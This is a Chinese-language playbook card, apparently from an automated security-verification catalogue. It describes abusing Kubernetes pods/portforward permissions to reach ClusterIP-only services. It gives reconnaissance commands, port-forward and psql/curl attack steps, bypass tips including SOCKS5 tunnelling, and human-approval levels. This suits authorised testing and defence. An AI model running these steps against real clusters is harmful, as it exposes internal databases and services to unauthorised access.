---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-3.7]
mapped_compliance_families: [RBAC, 端口转发]
---

# kubectl-portforward-abuse — kubectl port-forward 内部服务暴露

攻击者持有 `pods/portforward` 的 `create` 权限，通过 `kubectl port-forward` 把 Pod 内部端口映射到本地，将集群内部仅 ClusterIP 可达的服务（数据库、监控、admin UI）暴露到攻击者本机，绕过 Service 类型和 Ingress 暴露控制。

---

## 1. 前置条件

- 当前身份被授予 `pods/portforward` 的 `create` 权限
- 集群内存在 ClusterIP-only 的敏感服务（如 DB、Prometheus、etcd admin）
- 攻击者本地可运行 kubectl

检查命令：
```bash
# [L0] 探测：检查 portforward 权限
kubectl auth can-i create pods/portforward
# 期望输出: yes

# [L0] 探测：列出 ClusterIP-only Service
kubectl get svc -A | grep -v LoadBalancer | grep -v NodePort
# 期望输出: 仅 ClusterIP 的内部服务列表
```

## 2. 探测命令

```bash
# [L0] 探测：确认 portforward 权限
kubectl auth can-i create pods/portforward --all-namespaces
# 期望输出: yes（全命名空间可转发）

# [L0] 探测：识别敏感内部服务（数据库/监控）
kubectl get svc -A -o wide | grep -iE "postgres|mysql|redis|prometheus|grafana|admin"
# 期望输出: 敏感服务名与 Pod

# [L0] 探测：找到目标服务的 Pod
kubectl get pods -n <ns> -l app=<svc-name> -o wide
# 期望输出: 对应 Pod 名称与端口
```

## 3. 攻击验证

```bash
# [L2] 攻击验证：转发目标 Pod 端口到本地
kubectl port-forward -n <ns> <pod-name> 8080:80 &
# 期望输出: Forwarding from 127.0.0.1:8080 -> 80

# [L2] 攻击验证：通过本地端口访问目标内部服务
curl -s http://127.0.0.1:8080/
# 期望输出: 内部服务响应

# [L2] 攻击验证：转发数据库端口连接
kubectl port-forward -n <ns> <db-pod> 5432:5432 &
psql -h 127.0.0.1 -U postgres -p 5432
# 期望输出: 数据库连接成功（绕过 Service 暴露控制）
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：本地无监听 8080
ss -lntp | grep :8080
# 期望输出: 无 8080 监听

# [L0] 攻击后环境对比：本地监听 8080 转发到内部服务
ss -lntp | grep :8080
# 期望输出: 127.0.0.1:8080 kubectl 进程 → 证明端口转发成功

# [L1] 攻击前：外部无法访问 ClusterIP 服务
curl -s --max-time 3 http://<clusterip>:80
# 期望输出: 超时（ClusterIP 仅集群内可达）

# [L1] 攻击后：通过 port-forward 本地可达
curl -s http://127.0.0.1:8080/
# 期望输出: 内部服务响应 → 证明绕过暴露控制
```

差分结论：攻击前 ClusterIP 服务外部不可达，攻击后通过 `kubectl port-forward` 在本地 8080 可访问，证明内部服务被暴露到攻击者本机。

## 5. 绕过策略

```bash
# [L0] 检查 RBAC 是否限制 portforward
kubectl auth can-i create pods/portforward
# 若 no → 无法滥用

# 绕过方式：
# - [L2] 若仅部分命名空间有权限，优先转发该命名空间内敏感服务
# - [L2] 若 PodSecurity 限制 exec，但 portforward 不依赖 exec 仍可转发
# - [L2] 若网络出口限制，使用 SOCKS5 模式通过 port-forward 转发任意流量
```

## 6. 证伪条件

```bash
# [L0] 无 portforward 权限
kubectl auth can-i create pods/portforward
# 输出: no → 证伪

# [L2] port-forward 失败
kubectl port-forward <pod> 8080:80 2>&1
# 输出: forbidden 或 unable to listen → 证伪

# [L2] 端口已转发但服务不可达
curl -s --max-time 3 http://127.0.0.1:8080/
# 输出: 超时或拒绝 → 证伪
```

## 7. 审批级别

- **L2** 攻击验证（建立本地端口转发连接内部服务）→ **Level 4**（暴露内部服务，需人工确认）
- **L1** 探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Lateral Movement / Exfiltration
- **Technique ID**: T1021
- **Technique Name**: Remote Services
- **描述**: 攻击者持有 `pods/portforward` 的 `create` 权限，通过 `kubectl port-forward` 把集群内 ClusterIP-only 的敏感服务转发到本地，绕过 Service 暴露控制访问数据库、监控等内部服务。